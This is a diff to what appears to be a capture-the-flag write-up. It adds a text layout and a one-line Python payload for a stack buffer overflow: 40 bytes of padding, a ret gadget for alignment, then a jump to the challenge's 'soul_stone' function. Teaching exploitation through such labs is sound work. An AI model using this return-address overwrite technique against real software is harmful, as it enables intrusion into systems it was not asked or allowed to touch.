@@ -103,7 +103,14 @@ In x86-64 Linux ABI, GLIBC functions (such as `printf` inside `soul_stone`) exec
 
 To resolve this, we prepend a single `ret` gadget (`0x40101a`) before jumping to `soul_stone` (`0x4011d6`):
 
-$$\text{Payload} = \text{"A"} \times 40 + \text{p64}(\text{ret}) + \text{p64}(\text{soul\_stone})$$
+```text
+Payload Layout:
+[ 40 bytes padding ("A" * 40) ] + [ 8 bytes ret gadget (0x40101a) ] + [ 8 bytes soul_stone (0x4011d6) ]
+```
+
+```python
+payload = b"A" * 40 + p64(0x40101a) + p64(0x4011d6)
+```
 
 ### Exploit & Solver Script (`solve.py` / `exploit.py`)
 
